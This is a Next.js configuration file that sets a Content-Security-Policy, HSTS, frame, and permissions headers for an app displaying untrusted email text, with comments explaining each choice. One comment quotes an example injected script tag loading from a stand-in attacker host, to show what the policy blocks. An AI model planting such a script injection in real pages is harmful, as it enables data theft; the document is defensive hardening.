import type { NextConfig } from "next";

/**
 * Content-Security-Policy for the app itself. Until now only /sw.js had one,
 * so the pages that render other people's email subjects and snippets — the
 * review inbox, which is the only place genuinely untrusted text is displayed
 * — had no second line of defence at all. React escapes by default and there
 * is no dangerouslySetInnerHTML anywhere in this codebase, so this is not
 * patching a known hole; it is the seatbelt for the one someone introduces
 * later.
 *
 * Two deliberate compromises, both about what would otherwise break:
 *
 *   `'unsafe-inline'` on script-src — Next's App Router inlines bootstrap and
 *   flight-data scripts. Removing it needs a per-request nonce generated in
 *   the proxy and threaded through, which is real work and real risk. What
 *   this policy still buys without a nonce is the part that matters most: an
 *   injected `<script src="https://attacker.example/x.js">` will not load,
 *   because no third-party origin is allowed. Exfiltration to another origin
 *   is blocked by connect-src for the same reason.
 *
 *   `'unsafe-eval'` in development only — Turbopack's HMR needs it. It is
 *   absent from the production policy.
 *
 * `frame-ancestors 'none'` duplicates X-Frame-Options on purpose: the older
 * header is what some corporate proxies still honour.
 */
const isDev = process.env.NODE_ENV === "development";

const contentSecurityPolicy = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
  // Tailwind v4 and this app's heavy use of `style={{…}}` both emit inline styles.
  "style-src 'self' 'unsafe-inline'",
  // blob:/data: are the camera-roll preview before a background photo uploads;
  // the Vercel Blob host is where it lands afterwards.
  "img-src 'self' blob: data: https://*.public.blob.vercel-storage.com",
  "font-src 'self' data:",
  // Same-origin only. This is the line that stops a script from posting
  // someone's balances to an attacker's server.
  `connect-src 'self' https://*.public.blob.vercel-storage.com${isDev ? " ws: http://localhost:*" : ""}`,
  "form-action 'self'",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "object-src 'none'",
  "worker-src 'self'",
  "manifest-src 'self'",
]
  .join("; ")
  .concat(isDev ? "" : "; upgrade-insecure-requests");

const nextConfig: NextConfig = {
  serverExternalPackages: ["web-push", "@anthropic-ai/sdk", "imapflow"],
  async redirects() {
    return [
      // /money became /budget (every other route matches its nav label).
      // Keeps existing bookmarks, the installed PWA's start history, and any
      // old digest-email links working. Query string is preserved, so the
      // month/venture params on /money?m=…&venture=… survive.
      { source: "/money", destination: "/budget", permanent: true },
    ];
  },
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          // Force HTTPS for a year, subdomains included. `*.vercel.app` is
          // already HSTS-preloaded at the domain level, so today this is
          // belt-and-braces — but it stops being free the moment this app
          // moves to hub.cmacservices.ca, and a header added at that point is
          // a header someone has to remember to add.
          {
            key: "Strict-Transport-Security",
            value: "max-age=31536000; includeSubDomains",
          },
          // Nothing here uses these. Denying them means a script that somehow
          // does run still cannot reach the camera, mic or location.
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=(), payment=(), usb=()",
          },
          { key: "Content-Security-Policy", value: contentSecurityPolicy },
        ],
      },
      {
        source: "/sw.js",
        headers: [
          { key: "Content-Type", value: "application/javascript; charset=utf-8" },
          { key: "Cache-Control", value: "no-cache, no-store, must-revalidate" },
          { key: "Content-Security-Policy", value: "default-src 'self'; script-src 'self'" },
        ],
      },
    ];
  },
};

export default nextConfig;
